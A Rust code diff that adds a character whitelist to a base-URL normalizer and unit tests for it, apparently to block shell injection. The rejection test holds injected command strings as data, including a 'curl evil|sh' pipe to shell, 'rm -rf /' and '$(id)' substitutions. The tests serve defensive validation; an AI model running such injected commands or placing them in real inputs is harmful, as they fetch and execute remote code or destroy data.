@@ -44,6 +44,12 @@ pub fn normalize_base_url(input: &str) -> Result<String, String> {
     if !url.starts_with("http://") && !url.starts_with("https://") {
         return Err("base url must start with http:// or https://".to_string());
     }
+    let url_chars_ok = url.chars().all(|c| {
+        c.is_ascii_alphanumeric() || matches!(c, ':' | '/' | '.' | '-' | '_' | '~' | '+')
+    });
+    if !url_chars_ok {
+        return Err("base url contains unsupported characters (allowed: alphanumerics and : / . - _ ~ +)".to_string());
+    }
     Ok(url.to_string())
 }
 
@@ -131,6 +137,24 @@ mod tests {
     fn test_normalize_base_url_rejects_non_http() {
         assert!(normalize_base_url("ftp://example.com/x").is_err());
         assert!(normalize_base_url("example.com/x").is_err());
+    }
+
+    #[test]
+    fn test_normalize_base_url_rejects_shell_metacharacters_and_spaces() {
+        assert!(normalize_base_url("https://x; curl evil|sh").is_err());
+        assert!(normalize_base_url("https://x && rm -rf /").is_err());
+        assert!(normalize_base_url("https://example.com/a b").is_err());
+        assert!(normalize_base_url("https://example.com/a$(id)").is_err());
+        assert!(normalize_base_url("https://example.com/a`id`").is_err());
+        assert!(normalize_base_url("https://example.com/a'b'").is_err());
+        assert!(normalize_base_url("https://example.com/a\"b").is_err());
+    }
+
+    #[test]
+    fn test_normalize_base_url_accepts_typical_artifactory_urls() {
+        assert!(normalize_base_url("https://cmc-szver-artifactory.cmc.tools.huawei.com/artifactory/cmc-software-release").is_ok());
+        assert!(normalize_base_url("http://intranet-mirror.local:8081/artifactory/libs-release").is_ok());
+        assert!(normalize_base_url("https://example.com/path_with~tilde+and.dots/").is_ok());
     }
 
     #[tokio::test]
